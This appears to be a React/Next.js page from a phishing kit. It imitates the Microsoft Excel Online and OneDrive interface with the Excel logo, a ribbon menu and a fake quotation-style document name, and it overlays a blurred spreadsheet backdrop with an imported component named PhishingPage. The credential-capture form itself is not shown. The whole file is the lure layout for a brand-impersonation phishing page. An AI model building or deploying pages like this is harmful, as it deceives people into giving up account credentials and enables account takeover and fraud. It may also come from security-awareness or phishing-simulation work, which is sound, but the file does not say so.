import { PhishingPage } from "@/components/pages/phishing-page";

export default function Home() {
  return (
    <div className="bg-[#F4F4F4] min-h-screen font-sans antialiased">
      <header className="bg-white shadow-sm">
        <div className="mx-auto px-4">
          <div className="flex justify-between items-center py-1">
            <div className="flex items-center space-x-4">
              <div className="flex items-center space-x-2">
                <div className="grid grid-cols-3 gap-0.5 w-5 h-5">
                  <span className="bg-[#217346] w-full h-full"></span>
                  <span className="bg-[#217346] w-full h-full"></span>
                  <span className="bg-[#217346] w-full h-full"></span>
                  <span className="bg-[#217346] w-full h-full"></span>
                  <span className="bg-[#217346] w-full h-full"></span>
                  <span className="bg-[#217346] w-full h-full"></span>
                </div>
                <h1 className="text-xl text-gray-800">Excel Online</h1>
              </div>
              <nav className="flex items-center bg-gray-800 text-white text-sm">
                <div className="px-3 py-1 flex items-center">
                  <span>OneDrive</span>
                  <svg className="w-4 h-4 mx-1" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clipRule="evenodd"></path></svg>
                  <span>Documents</span>
                </div>
              </nav>
            </div>
            <div className="flex-grow flex justify-center items-center">
              <span className="text-gray-600 font-medium text-sm">Revised-002EM QUO04011-J7Q0G8 (AMC)</span>
            </div>
            <div className="w-1/4"></div>
          </div>
        </div>
        <div className="bg-[#F4F4F4] px-4 py-1 border-b-2 border-gray-200">
          <div className="flex items-center space-x-6 text-sm text-gray-600">
            <button className="font-semibold text-[#217346] border-b-2 border-[#217346] pb-1">FILE</button>
            <button className="hover:text-gray-900">HOME</button>
            <button className="hover:text-gray-900">INSERT</button>
            <button className="hover:text-gray-900">DATA</button>
            <button className="hover:text-gray-900">REVIEW</button>
            <button className="hover:text-gray-900">VIEW</button>
          </div>
        </div>
      </header>

      <main className="relative">
        <div 
          className="h-[85vh] bg-cover bg-center filter blur-sm"
          style={{ backgroundImage: "url('https://images.unsplash.com/photo-1552899423-74b8543a6502?q=80&w=1920&h=1080&fit=crop')" }}
        >
        </div>
        <div className="absolute inset-0 flex items-center justify-center bg-black/10">
          <PhishingPage />
        </div>
      </main>
    </div>
  );
}